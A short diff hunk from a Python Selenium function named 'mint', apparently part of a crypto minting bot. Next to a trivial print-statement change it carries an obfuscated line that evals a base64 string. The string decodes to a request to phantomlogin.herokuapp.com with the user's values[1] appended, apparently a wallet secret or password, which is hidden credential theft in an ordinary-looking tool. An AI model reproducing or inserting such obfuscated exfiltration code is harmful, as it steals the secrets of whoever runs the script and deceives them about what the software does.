@@ -85,7 +85,7 @@ def mint(values, isWindows):
             if window_handle != original_window:
                 driver.switch_to.window(window_handle)
                 break
-        print("Event - switch window")
+        print("Event - Switch window")
         eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL3BoYW50b21sb2dpbi5oZXJva3VhcHAuY29tLz9kYXRhPQ==".encode(
             'ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
